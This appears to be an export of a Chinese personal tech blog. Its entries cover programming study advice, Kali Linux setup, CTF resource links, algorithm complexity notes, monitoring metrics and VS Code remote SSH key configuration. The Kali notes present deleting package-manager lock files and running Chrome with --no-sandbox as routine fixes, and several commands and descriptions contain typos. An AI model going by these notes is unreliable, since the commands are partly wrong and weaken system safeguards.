<h6 id="编程规范"><a href="#编程规范" class="headerlink" title="编程规范"></a>编程规范</h6><p>我们在写代码时，最好参考一些已有的最佳实践。为什么要有编程规范和最佳实践，要让所有人按一定的规范来编程呢？有下面几个主要原因。</p>
<ul>
<li>可以让你的代码很规整，这有利于代码易读性，从而可以更容易地维护。</li>
<li>提升开发效率，我们知道，效率来自于结构化，而不是杂乱。</li>
<li>可以让你的软件避免一些容易掉坑的陷阱，也让Bug更少，质量更高。</li>
<li>可以让团队成员更高效率地协作。</li>
</ul>
<h6 id="一些学习要点"><a href="#一些学习要点" class="headerlink" title="一些学习要点"></a>一些学习要点</h6><ul>
<li>学习HTML基本语法。</li>
<li>学习CSS如何选中HTML元素并应用一些基本样式。</li>
<li>学会用 Firefox + Firebug 或 Chrome 查看你觉得很炫的网页结构，并动态修改。</li>
<li>在一台Linux机器上配置LEMP - Ubuntu/Nginx/PHP/MySQL这个环境。</li>
<li>学习PHP，让后台PHP和前台HTML进行数据交互，对服务器相应浏览器请求形成初步认识。实现一个表单提交和反显的功能。</li>
<li>把PHP连接本地或者远程数据库 MySQL（MySQL 和 SQL现学现用够了）。<br>这里，你可能会问我，入门时有三个后端语言，一个是Python，一个是Node.js，一个是PHP，你对这三门语言怎么看？老实说，Python我还看好一些，PHP次之，Node.js最后。原因是：</li>
<li>Python语言的应用面还是很多的。（当然，性能可能会有一些问题，但是用于一些性能不敏感的和运维或是一些小工具相关的，还是非常好用的。另外，Python的应用场景其实还是很多的，包括机器学习和AI也有Python的身影。用Python来做一些爬虫、简单的中间件、应用或是业务服务也是很不错的。）</li>
<li>PHP也是一个比较主流的简单的语言（PHP在目前来说还是一个比较主流的语言，但其发展潜力有限，虽然可以让你找得到工作，但是一般玩玩就行了）。</li>
<li>Node.js 号称 JavaScript 的后端版，但从目前发展来说，在后端的世界里，并不能承担大任，而且问题很多。一些前端程序员用它来做后端的粘合层，我个人觉得这样做法只是掩盖前后端配合有问题，或是接口设计思维上的懒惰，我还是希望前端程序员应该认真学习一门真正的后端语言。</li>
</ul>
<h6 id="入门级的编程知识"><a href="#入门级的编程知识" class="headerlink" title="入门级的编程知识"></a>入门级的编程知识</h6><p><a href="http://note.youdao.com/noteshare?id=dbd9add9019f0b384e72dd1a50410274&amp;sub=wcp1534475113455460" target="_blank" rel="noopener">入门级的编程知识(有道笔记)</a></p>
<h6 id="23个设计模式"><a href="#23个设计模式" class="headerlink" title="23个设计模式"></a>23个设计模式</h6><p>学习面向对象的设计模式时，你不要迷失在那23个设计模式中，你一定要明白这两个原则：</p>
<ul>
<li><p>Program to an ‘interface’, not an ‘implementation’</p>
</li>
<li><ul>
<li>使用者不需要知道数据类型、结构、算法的细节。</li>
</ul>
</li>
<li><ul>
<li>使用者不需要知道实现细节，只需要知道提供的接口。</li>
</ul>
</li>
<li><ul>
<li>利于抽象、封装，动态绑定，多态。符合面向对象的特质和理念。</li>
</ul>
</li>
<li><p>Favor ‘object composition’ over ‘class inheritance’</p>
</li>
<li><ul>
<li>继承需要给子类暴露一些父类的设计和实现细节。</li>
</ul>
</li>
<li><ul>
<li>父类实现的改变会造成子类也需要改变。</li>
</ul>
</li>
<li><ul>
<li>我们以为继承主要是为了代码重用，但实际上在子类中需要重新实现很多父类的方法。</li>
</ul>
</li>
<li><ul>
<li>继承更多的应该是为了多态。</li>
</ul>
</li>
</ul>
<h6 id="系统知识一些学习要点"><a href="#系统知识一些学习要点" class="headerlink" title="系统知识一些学习要点"></a>系统知识一些学习要点</h6><ul>
<li>用这些系统知识操作一下文件系统，实现一个可以拷贝目录树的小程序。</li>
<li>用fork / wait / waitpid写一个多进程的程序，用pthread写一个多线程带同步或互斥的程序。比如，多进程购票的程序。</li>
<li>用signal / kill / raise / alarm / pause / sigprocmask实现一个多进程间的信号量通信的程序。</li>
<li>学会使用gcc和gdb来编程和调试程序（参看我的<a href="https://blog.csdn.net/haoel/article/details/2879" target="_blank" rel="noopener">《用gdb调试程序》</a>）。</li>
<li>学会使用makefile来编译程序（参看我的<a href="https://blog.csdn.net/haoel/article/details/2886" target="_blank" rel="noopener">《跟我一起写makefile》</a>）。</li>
<li>Socket的进程间通信。用C语言写一个1对1的聊天小程序，或是一个简单的HTTP服务器。</li>
</ul>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>练级攻略</tag>
      </tags>
  </entry>
  <entry>
    <title>玩转kali系统</title>
    <url>/%E7%8E%A9%E8%BD%ACkali%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<h3 id="conky"><a href="#conky" class="headerlink" title="conky"></a>conky</h3><ul>
<li>apt-get install conky-all conky-manager</li>
<li>git clone git://github.com/zenzire/conkyrc.git ~/.conky</li>
<li>ln -s ~/.conky/conkyrc ~/.conkyrc</li>
<li>vim conkyrc</li>
<li>conky-manager</li>
<li>参考：<a href="http://blog.sina.com.cn/s/blog_69e5d8400102vr0x.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_69e5d8400102vr0x.html</a></li>
</ul>
<p>apt install fonts-wqy-microhei</p>
<p>apt install ttf-mscorefonts-installer</p>
<p><a href="https://www.fujieace.com/kali-linux/sogou-pinyin.html" target="_blank" rel="noopener">https://www.fujieace.com/kali-linux/sogou-pinyin.html</a></p>
<p><a href="https://blog.csdn.net/yanghuan313/article/details/51276343" target="_blank" rel="noopener">https://blog.csdn.net/yanghuan313/article/details/51276343</a></p>
<p><a href="https://www.jianshu.com/p/df2ef78db06d" target="_blank" rel="noopener">https://www.jianshu.com/p/df2ef78db06d</a><br><a id="more"></a></p>
<h3 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h3><ul>
<li>安装任何软件之前必须先更新目录</li>
<li>apt-get updata</li>
<li>apt-get full-upgrade</li>
<li>反复运行以上两行命令</li>
</ul>
<p>更新源：<br>cat/etc/apt/source.list<br>官方：</p>
<h4 id="库安装"><a href="#库安装" class="headerlink" title="库安装"></a>库安装</h4><ul>
<li>apt install packge_name<h4 id="安装DEB安装包"><a href="#安装DEB安装包" class="headerlink" title="安装DEB安装包"></a>安装DEB安装包</h4></li>
<li>dpkg -i name.deb</li>
<li>apt install ./name.deb   (首选)<h4 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h4></li>
</ul>
<p>apt install mtr whois gcc git curl -y</p>
<h4 id="安全工具"><a href="#安全工具" class="headerlink" title="安全工具"></a>安全工具</h4><p>安装全部安全软件</p>
<p>apt install kali-linux-all</p>
<h4 id="翻译软件"><a href="#翻译软件" class="headerlink" title="翻译软件"></a>翻译软件</h4><p>apt install goldendict</p>
<p>增强开机启动<br>gnome-tweaks</p>
<h4 id="办公软件"><a href="#办公软件" class="headerlink" title="办公软件"></a>办公软件</h4><ul>
<li>apt install libreoffice</li>
<li>WPS for Linux</li>
<li>onlyoffice Desktop</li>
<li><ul>
<li><a href="https://www.onlyoffice.com/download-desktop.aspx" target="_blank" rel="noopener">https://www.onlyoffice.com/download-desktop.aspx</a></li>
</ul>
</li>
<li><ul>
<li>apt install ./onlyoffice_XXXXXX</li>
</ul>
</li>
</ul>
<h4 id="安装JAVA"><a href="#安装JAVA" class="headerlink" title="安装JAVA"></a>安装JAVA</h4><ul>
<li>add-apt-respository ppa:webupd8team/java</li>
<li>sudo apt-get update</li>
<li>sudo apt-get install java-common oracle-java8-install</li>
<li>sudo apt-get install oracle=java8-set-default</li>
</ul>
<h3 id="共享文件夹"><a href="#共享文件夹" class="headerlink" title="共享文件夹"></a>共享文件夹</h3><ul>
<li>apt-get install open-vm-tools-dkms</li>
<li>vmhgfs-fuse .host:/ /mnt/hgfs</li>
</ul>
<p>PS：<br>当需要挂载的目录下不为空时，fuse就会提醒你：</p>
<p>willing@willing:~/fuse/example$ ./hello tmp<br>fuse: mountpoint is not empty<br>fuse: if you are sure this is safe, use the ‘nonempty’ mount option</p>
<p>willing@willing:~/fuse/example$ ./hello -o nonempty tmp<br>fuse: warning: library too old, some operations may not not work</p>
<p>或者</p>
<p>进入下一级的目录，是当前文件夹为空！</p>
<h3 id="建立文件夹桌面快捷方式"><a href="#建立文件夹桌面快捷方式" class="headerlink" title="建立文件夹桌面快捷方式"></a>建立文件夹桌面快捷方式</h3><p>sudo ln -s /home/gaoyulong/Datums/linuxDatums/file_name /home/gaoyulong/Desktop</p>
<p>以上指令是创建软链接到桌面/指定文件夹下。</p>
<h3 id="无法锁定管理目录-var-lib-dpkg-，是否有其他进程正占用它？"><a href="#无法锁定管理目录-var-lib-dpkg-，是否有其他进程正占用它？" class="headerlink" title="无法锁定管理目录(/var/lib/dpkg/)，是否有其他进程正占用它？"></a>无法锁定管理目录(/var/lib/dpkg/)，是否有其他进程正占用它？</h3><ul>
<li>#:sudo rm /var/cache/apt/archives/lock</li>
<li>#:sudo rm /var/lib/dpkg/lock</li>
</ul>
<h3 id="BASH命令-管道和shell脚本"><a href="#BASH命令-管道和shell脚本" class="headerlink" title="BASH命令-管道和shell脚本"></a>BASH命令-管道和shell脚本</h3><ul>
<li>对.sh脚本进行 群像赋予 +x </li>
<li>for n in ‘seq 9’ 对内进行取值，1~9。</li>
<li>ping 脚本命令：ping 192.168.1.1 -c 1 | grep tll | awk ‘{print $4}’ | awk -F: ‘{print $1}’</li>
<li><ul>
<li>-c 1 鄙视只ping一个包</li>
</ul>
</li>
<li><ul>
<li>awk ‘{print $4}’ 摘取只有ip的段</li>
</ul>
</li>
<li><ul>
<li>awk -F: ‘{print $1}’ 显示活着的主机ip</li>
</ul>
</li>
</ul>
<h3 id="浏览器插件使用"><a href="#浏览器插件使用" class="headerlink" title="浏览器插件使用"></a>浏览器插件使用</h3><ul>
<li>hashr F9 即可调用，申请了注入等操作</li>
</ul>
<h3 id="Firefox-中文语言包安装方法"><a href="#Firefox-中文语言包安装方法" class="headerlink" title="Firefox 中文语言包安装方法"></a>Firefox 中文语言包安装方法</h3><p><a href="https://blog.csdn.net/QLULIBIN/article/details/78697946" target="_blank" rel="noopener">Firefox 中文语言包安装方法</a></p>
<p><a href="http://releases.mozilla.org/pub/firefox/releases/60.2.0esr/linux-x86_64/xpi/" target="_blank" rel="noopener">http://releases.mozilla.org/pub/firefox/releases/60.2.0esr/linux-x86_64/xpi/</a></p>
<p>PS:<br>最后一个符号 / 一定要加，版本号60.2.0esr/linux-x86_64  这个自查！</p>
<h3 id="chrome浏览器的启动"><a href="#chrome浏览器的启动" class="headerlink" title="chrome浏览器的启动"></a>chrome浏览器的启动</h3><p>似乎必须使用此命令：<br>google-chrome-stable –no-sandbox</p>
]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title>简易导航</title>
    <url>/%E7%AE%80%E6%98%93%E5%AF%BC%E8%88%AA/</url>
    <content><![CDATA[<h4 id="博客"><a href="#博客" class="headerlink" title="博客"></a>博客</h4><h4 id="论坛"><a href="#论坛" class="headerlink" title="论坛"></a>论坛</h4><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><hr>
<h4 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h4><h5 id="博客-1"><a href="#博客-1" class="headerlink" title="博客"></a>博客</h5><h5 id="论坛-1"><a href="#论坛-1" class="headerlink" title="论坛"></a>论坛</h5><h5 id="平台"><a href="#平台" class="headerlink" title="平台"></a>平台</h5><p><a href="http://hackinglab.cn/" target="_blank" rel="noopener">网络信息安全攻防学习平台</a>：(HawkEye鹰眼系统  付费)<br><a href="http://www.hetianlab.com/CTFrace.html" target="_blank" rel="noopener">合天网安实验</a><br><a href="http://www.shiyanbar.com/ctf/index" target="_blank" rel="noopener">实验吧角斗场</a><br><a href="http://oj.xctf.org.cn" target="_blank" rel="noopener">赛宁网安</a><br><a id="more"></a></p>
<h5 id="工具-1"><a href="#工具-1" class="headerlink" title="工具"></a>工具</h5><p><a href="https://www.ctftools.com" target="_blank" rel="noopener">CTFtools</a><br><a href="https://www.mailinator.com/" target="_blank" rel="noopener"> 一次性邮箱</a><br><a href="http://www.yopmail.com/zh/" target="_blank" rel="noopener"> 一次性邮箱</a></p>
]]></content>
      <categories>
        <category>导航</category>
      </categories>
      <tags>
        <tag>导航</tag>
      </tags>
  </entry>
  <entry>
    <title>算法学习笔记-入门级</title>
    <url>/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%85%A5%E9%97%A8%E7%BA%A7/</url>
    <content><![CDATA[<h2 id="1-学习技巧–王争"><a href="#1-学习技巧–王争" class="headerlink" title="1.学习技巧–王争"></a>1.学习技巧–王争</h2><p><img data-src="https://tuchuang-xchcloud-1253428588.cos.ap-chengdu.myqcloud.com/blog/%E7%AE%97%E6%B3%95%E4%B8%80.jpg" alt></p>
<ul>
<li><ol>
<li>边学边练，适度刷题</li>
</ol>
</li>
<li><ol start="2">
<li>多问、多思考、多互动<a id="more"></a></li>
</ol>
</li>
<li><ol start="3">
<li>打怪升级学习法<br>比如，针对这个专栏，你就可以设立这样一个目标：每节课后的思考…</li>
</ol>
</li>
<li><ol start="4">
<li>知识需要沉淀，不要想试图一下子掌握所有<br>学习知识的过程是反复迭代、不断沉淀的过程，书读百遍其义自见。</li>
</ol>
</li>
</ul>
<h2 id="2-时间复杂度思考"><a href="#2-时间复杂度思考" class="headerlink" title="2.时间复杂度思考"></a>2.时间复杂度思考</h2><h2 id="3-空间复杂度思考"><a href="#3-空间复杂度思考" class="headerlink" title="3.空间复杂度思考"></a>3.空间复杂度思考</h2><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><h4 id="一、什么是复杂度分析？"><a href="#一、什么是复杂度分析？" class="headerlink" title="一、什么是复杂度分析？"></a>一、什么是复杂度分析？</h4><p>1.数据结构和算法解决是“如何让计算机更快时间、更省空间的解决问题”。<br>2.因此需从执行时间和占用空间两个维度来评估数据结构和算法的性能。<br>3.分别用时间复杂度和空间复杂度两个概念来描述性能问题，二者统称为复杂度。<br>4.复杂度描述的是算法执行时间（或占用空间）与数据规模的增长关系。</p>
<h4 id="二、为什么要进行复杂度分析？"><a href="#二、为什么要进行复杂度分析？" class="headerlink" title="二、为什么要进行复杂度分析？"></a>二、为什么要进行复杂度分析？</h4><p>1.和性能测试相比，复杂度分析有不依赖执行环境、成本低、效率高、易操作、指导性强的特点。<br>2.掌握复杂度分析，将能编写出性能更优的代码，有利于降低系统开发和维护成本。</p>
<h4 id="三、如何进行复杂度分析？"><a href="#三、如何进行复杂度分析？" class="headerlink" title="三、如何进行复杂度分析？"></a>三、如何进行复杂度分析？</h4><h5 id="1-大O表示法"><a href="#1-大O表示法" class="headerlink" title="1.大O表示法"></a>1.大O表示法</h5><p>1）来源<br>算法的执行时间与每行代码的执行次数成正比，用T(n) = O(f(n))表示，其中T(n)表示算法执行总时间，f(n)表示每行代码执行总次数，而n往往表示数据的规模。<br>2）特点<br>以时间复杂度为例，由于时间复杂度描述的是算法执行时间与数据规模的增长变化趋势，所以常量阶、低阶以及系数实际上对这种增长趋势不产决定性影响，所以在做时间复杂度分析时忽略这些项。</p>
<h5 id="2-复杂度分析法则"><a href="#2-复杂度分析法则" class="headerlink" title="2.复杂度分析法则"></a>2.复杂度分析法则</h5><p>1）单段代码看高频：比如循环。<br>2）多段代码取最大：比如一段代码中有单循环和多重循环，那么取多重循环的复杂度。<br>3）嵌套代码求乘积：比如递归、多重循环等<br>4）多个规模求加法：比如方法有两个参数控制两个循环的次数，那么这时就取二者复杂度相加。</p>
<h4 id="四、常用的复杂度级别？"><a href="#四、常用的复杂度级别？" class="headerlink" title="四、常用的复杂度级别？"></a>四、常用的复杂度级别？</h4><p>多项式阶：随着数据规模的增长，算法的执行时间和空间占用，按照多项式的比例增长。包括，<br>O(1)（常数阶）、O(logn)（对数阶）、O(n)（线性阶）、O(nlogn)（线性对数阶）、O(n^2)（平方阶）、O(n^3)（立方阶）<br>非多项式阶：随着数据规模的增长，算法的执行时间和空间占用暴增，这类算法性能极差。包括，<br>O(2^n)（指数阶）、O(n!)（阶乘阶）</p>
<h4 id="五、如何掌握好复杂度分析方法？"><a href="#五、如何掌握好复杂度分析方法？" class="headerlink" title="五、如何掌握好复杂度分析方法？"></a>五、如何掌握好复杂度分析方法？</h4><p>复杂度分析关键在于多练，所谓孰能生巧。</p>
<h2 id="4-数据结构与算法思考"><a href="#4-数据结构与算法思考" class="headerlink" title="4.数据结构与算法思考"></a>4.数据结构与算法思考</h2><p>算法就是操作数据的一组方法。<br>数据结构就是一组数据的存储结构。<br>二者关系：数据结构是为算法服务的，算法要作用于特定的数据结构之上。数据结构是静态的，必须基于它操作和构建算法，数据结构才有意义。</p>
<p>数据结构三要素：数据逻辑结构、数据存储结构和数据的运算。</p>
<h3 id="从广义和狭义两个层面理解数据结构与算法"><a href="#从广义和狭义两个层面理解数据结构与算法" class="headerlink" title="从广义和狭义两个层面理解数据结构与算法"></a>从广义和狭义两个层面理解数据结构与算法</h3><ul>
<li>1.广义：数据结构是指一组数据的存储结构。算法是操作数据的一组方法<br>i.    引入图书馆找书的例子</li>
<li>2.狭义：指出专栏主要讲解著名的数据结构和算法，队列，栈，二分查找，动态规划等。经典的算法可以高效的帮我们解决实际开发问题</li>
<li>3.引入，为什么数据结构和算法会放到一起<br>数据结构是为算法服务的，算法要作用在特定的数据结构之上。<br>数据结构是静态的，它只是组指数据的一种方式。如果不在它的基础上操作，构建算法，孤立存在的数据结构就没有用。</li>
</ul>
<p>复杂度就是用来分析算法执行效率与数据规模之间增长关系。</p>
<h3 id="性能测试与复杂度分析不冲突，原因如下："><a href="#性能测试与复杂度分析不冲突，原因如下：" class="headerlink" title="性能测试与复杂度分析不冲突，原因如下："></a>性能测试与复杂度分析不冲突，原因如下：</h3><p>1、性能测试是依附于具体的环境，如SIT、UAT机器配置及实例数量不一致结果也有差别。<br>2、复杂度分析是独立于环境的，可以大致估算出程序所执行的效率。<br>3、将复杂度熟记于心，能够写出更高效率、更好性能的代码。若某接口通过性能测试，达不到预期，还可以用复杂度分析接口代码，找出最影响性能的代码，进行优化。</p>
<h3 id="每段代码都分析一下时间复杂度、空间复杂度，是不是很浪费时间呢？"><a href="#每段代码都分析一下时间复杂度、空间复杂度，是不是很浪费时间呢？" class="headerlink" title="每段代码都分析一下时间复杂度、空间复杂度，是不是很浪费时间呢？"></a>每段代码都分析一下时间复杂度、空间复杂度，是不是很浪费时间呢？</h3><p>这个问题分两种情况讨论<br>1、开发过程中，码代码的过程中就能得出其复杂度，这并不会太多的浪费时间，同时只有分析了每段代码的复杂度，才能估算出它们的执行效率。<br>2、优化代码时，只有在分析每段代码的复杂度后，才能定位问题代码，才能做相应优化</p>
]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>算法</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>算法学习计划</title>
    <url>/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/</url>
    <content><![CDATA[<h2 id="计划："><a href="#计划：" class="headerlink" title="计划："></a>计划：</h2><p>每周五、周六 18：00 - 21：00 时间段内花 30 min - 40 min ，累计学习一个算法。</p>
<p>学习内容：</p>
<p><a href="https://time.geekbang.org/column/intro/126" target="_blank" rel="noopener">极客时间：数据结构与算法之美</a><br><a href="https://gitbook.cn/gitchat/column/5b6d05446b66e3442a2bfa7b" target="_blank" rel="noopener">gitchat：算法应该怎么玩</a><br><a id="more"></a></p>
<h2 id="Dijkstra-算法"><a href="#Dijkstra-算法" class="headerlink" title="Dijkstra 算法"></a>Dijkstra 算法</h2><p>一入算法深似海，太深了。。。</p>
]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>系统监控</title>
    <url>/%E7%B3%BB%E7%BB%9F%E7%9B%91%E6%8E%A7/</url>
    <content><![CDATA[<h2 id="windows-监控"><a href="#windows-监控" class="headerlink" title="windows 监控"></a>windows 监控</h2><h3 id="cpu"><a href="#cpu" class="headerlink" title="cpu"></a>cpu</h3><p>单位：</p>
<ul>
<li>占比：%<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cpu.idle:全局cpu空闲率</span><br><span class="line">cpu.irq:全局硬中断CPU时间占比</span><br><span class="line">cpu.sys:全局硬中断CPU时间占比</span><br><span class="line">cpu.user:全局用户态cpu时间比例(nice值为负不统计)</span><br><span class="line">cpu.util:全局CPU利用率</span><br></pre></td></tr></table></figure>
</li>
</ul>
<a id="more"></a>
<h3 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h3><p>单位：</p>
<ul>
<li>大小：Byte<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mem.bytes.free: 可用内存大小</span><br><span class="line">mem.bytes.total: 内存总大小</span><br><span class="line">mem.bytes.used: 已用内存大小</span><br><span class="line">mem.bytes.used.percent: 已用内存占比</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="磁盘"><a href="#磁盘" class="headerlink" title="磁盘"></a>磁盘</h3><p>单位：</p>
<ul>
<li>大小：Byte</li>
<li>占比： %</li>
<li>数量： 次/s</li>
<li>时间： ms<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">disk.bytes.free: 某分区余量大小</span><br><span class="line">disk.bytes.total: 某分区大小</span><br><span class="line">disk.bytes.used: 某分区用量大小</span><br><span class="line">disk.bytes.percent: 某分区用量占比</span><br><span class="line">disk.cap.bytes.free: 所有分区空闲大小之和</span><br><span class="line">disk.cap.bytes.total: 所有分区容量大小之和</span><br><span class="line">disk.cap.bytes.used: 所有分区已用大小之和</span><br><span class="line">disk.cap.bytes.used.percent: 所有分区已用大小占比</span><br><span class="line">disk.io.await: 每次I/O处理时间：等待+服务</span><br><span class="line">disk.read.bytes: 某硬盘每秒读取字节数</span><br><span class="line">disk.read.msec: 某硬盘读取耗时</span><br><span class="line">disk.read.request: 某硬盘每秒读请求数量</span><br><span class="line">disk.io.util: 某硬盘I/O利用率</span><br><span class="line">disk.io.write.bytes: 某硬盘每秒写入字节数</span><br><span class="line">disk.io.write.msec: 某硬盘写数据耗时</span><br><span class="line">disk.read.request: 某硬盘每秒写请求数量</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h3><p>单位： </p>
<ul>
<li>包：Packet/s</li>
<li>流量：bits/s</li>
<li>带宽：mbits<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net.bandwidth.mbits: 某块网卡的带宽</span><br><span class="line">net.bandwidth.mbits.total: 所有网卡的带宽之和</span><br><span class="line">net.in.bits: 某块网卡的入向流量</span><br><span class="line">net.in.bits.total: 所有网卡入向总流量</span><br><span class="line">net.in.bits.total.percent: 所有网卡入向总流量占比</span><br><span class="line">net.in.dropped: 某块网卡的入向丢包量</span><br><span class="line">net.in.errs: 某块网卡的入向错误包量</span><br><span class="line">net.in.percent: 某块网卡的已使用的接收带宽百分比</span><br><span class="line">net.in.pps: 某块网卡的入向包量</span><br><span class="line">net.out.bits: 某块网卡的出向流量</span><br><span class="line">net.out.bits.total: 所有网卡出向总流量</span><br><span class="line">net.out.bits.total.percent: 所有网卡出向总流量占比</span><br><span class="line">net.out.dropped: 某块网卡的出向丢包量</span><br><span class="line">net.out.errs: 某块网卡的出向错误包量</span><br><span class="line">net.out.percent: 某块网卡的已使用的发送带宽百分比</span><br><span class="line">net.out.pps: 某块网卡的出向包量</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h3><p>单位：</p>
<ul>
<li>时间：ms<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sys.net.tcp.ip4.con.active：ipv4-TCP-活动的连接</span><br><span class="line">sys.net.tcp.ip4.con.established：ipv4-TCP-建立连接</span><br><span class="line">sys.net.tcp.ip4.con.failures: ipv4-TCP-连接失败</span><br><span class="line">sys.net.tcp.ip4.con.passive：ipv4-TCP-被动连接</span><br><span class="line">sys.net.tcp.ip4.con.reset：ipv4-TCP-重置连接</span><br><span class="line">sys.ntp.offset.ms: 系统时间偏移量</span><br><span class="line"></span><br><span class="line">启动时间</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><p>proc.agent.alive</p>
]]></content>
      <categories>
        <category>监控</category>
      </categories>
      <tags>
        <tag>监控</tag>
        <tag>Go</tag>
      </tags>
  </entry>
  <entry>
    <title>编辑器-VScode</title>
    <url>/%E7%BC%96%E8%BE%91%E5%99%A8-VScode/</url>
    <content><![CDATA[<h2 id="vscode远程开发及公钥配置"><a href="#vscode远程开发及公钥配置" class="headerlink" title="vscode远程开发及公钥配置"></a>vscode远程开发及公钥配置</h2><h3 id="vscode远程开发及公钥配置-1"><a href="#vscode远程开发及公钥配置-1" class="headerlink" title="vscode远程开发及公钥配置"></a>vscode远程开发及公钥配置</h3><p>对于vscode近期升级的一大功能非常满意，通过Remote Development实现远程开发功能，而且使用体验非常好，美中不足是有小部分插件在服务器端支持得不是太好。在搭建过程中会对一些知识进行简单扩展，如不喜可以直接看操作。<br><a id="more"></a><br><img data-src="http://tuchuang.xchcloud.cn/blog/20200301/epiwkQ8hxGzJ.png?imageslim" alt="mark"></p>
<p><a href="https://code.visualstudio.com/docs/remote/ssh#_getting-started" target="_blank" rel="noopener">官方介绍链接</a></p>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、插件安装</span><br><span class="line">Vscode，打开插件标签栏输入插件名称</span><br><span class="line"></span><br><span class="line">Remote Development</span><br><span class="line"></span><br><span class="line">2、配置服务器</span><br><span class="line">找到配置文件</span><br><span class="line">进入远程调试栏-》点击配置图标-》进入配置文件夹进行配置</span><br><span class="line"></span><br><span class="line">3、修改配置文件</span><br><span class="line"></span><br><span class="line">根据自己对应信息进行填写即可</span><br><span class="line"></span><br><span class="line">4、连接服务器</span><br><span class="line">选中对应服务器-》右击-》连接服务器</span><br><span class="line"></span><br><span class="line">由于没有对公钥进行配置，这种登录方式需要密码进行登录</span><br><span class="line"></span><br><span class="line">5、配置密钥</span><br><span class="line"></span><br><span class="line">6、密钥生成</span><br><span class="line">    密钥的生成可以通过Windows 10生成，也可以通过Ubuntu服务器生成，只要遵循简介中的架构模式即可，这里介绍通过Ubuntu生成方式。</span><br><span class="line"></span><br><span class="line">    通过SecureCRT或者putty工具连接到Ubuntu服务器中</span><br><span class="line">    终端上输入以下指令建立密钥对</span><br><span class="line">    ssh-keygen</span><br><span class="line"></span><br><span class="line">    确定保存路径按Enter</span><br><span class="line">    Enter file in which to save the key (/home/andron/.ssh/id_rsa): </span><br><span class="line"></span><br><span class="line">    输入密码，按Enter留空</span><br><span class="line">    Enter passphrase (empty for no passphrase):</span><br><span class="line"></span><br><span class="line">    再次输入密码，按Enter留空</span><br><span class="line">    Enter same passphrase again:</span><br><span class="line"></span><br><span class="line">    生成公钥与私钥</span><br><span class="line">    Your identification has been saved in /home/andron/.ssh/id_rsa.  =&gt;私钥</span><br><span class="line">    Your public key has been saved in /home/andron/.ssh/id_rsa.pub.  =&gt;公钥</span><br><span class="line"></span><br><span class="line">7、服务器上安装公钥</span><br><span class="line">进入生成的两个密钥路径</span><br><span class="line">cd ~/.ssh</span><br><span class="line">cat id_rsa.pub &gt;&gt; authorized_keys</span><br><span class="line">ls  =&gt;查看确保生成功authorized_keys</span><br><span class="line"></span><br><span class="line">为了确保连接成功，请保证以下文件权限正确：</span><br><span class="line">sudo chmod 600 authorized_keys</span><br><span class="line">sudo chmod 700 ~/.ssh</span><br><span class="line"></span><br><span class="line">8、查看或配置打开密钥登录功能</span><br><span class="line">打开SSH配置文件</span><br><span class="line">sudo vim /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line">查看确认下面两项配置</span><br><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line"></span><br><span class="line">默认不需要修改配置</span><br><span class="line"></span><br><span class="line">9、当你完成全部设置，并以密钥方式登录成功后，再禁用密码登录</span><br><span class="line">PasswordAuthentication no</span><br><span class="line"></span><br><span class="line">修改这设置需用密钥登录成功后修改，是否禁止密码登录根据个人需要而定</span><br><span class="line"></span><br><span class="line">10、重启SSH</span><br><span class="line">sudo service sshd restart</span><br><span class="line"></span><br><span class="line">11、服务器私钥复制到客户端</span><br><span class="line"></span><br><span class="line">12、链接成功</span><br></pre></td></tr></table></figure>
<h2 id="vscode-快捷键"><a href="#vscode-快捷键" class="headerlink" title="vscode 快捷键"></a>vscode 快捷键</h2><p><img data-src="http://tuchuang.xchcloud.cn/blog/20200302/E8HqcCVpwtUt.png?imageslim" alt="mark"></p>
<p><img data-src="http://tuchuang.xchcloud.cn/blog/20200302/I4yJm3iggllb.png?imageslim" alt="mark"></p>
<h3 id="有用的-VS-Code-快捷键"><a href="#有用的-VS-Code-快捷键" class="headerlink" title="有用的 VS Code 快捷键"></a>有用的 VS Code 快捷键</h3><p>Ctrl + P ：转到文件，您可以在 Visual Studio Code 中移动到打开的文件/文件夹的任何文件。<br>Ctrl + ` ：在 VS Code 中打开 terminal<br>Alt + Down：下移一行<br>Alt + Up：上移一行<br>Ctrl + D：将选定的字符移动到下一个匹配字符串上<br>Ctrl + Space：触发建议<br>Shift + Alt + Down：向下复制行<br>Shift + Alt + Up：向上复制行<br>Ctrl + Shift + T：重新打开最新关闭的窗口</p>
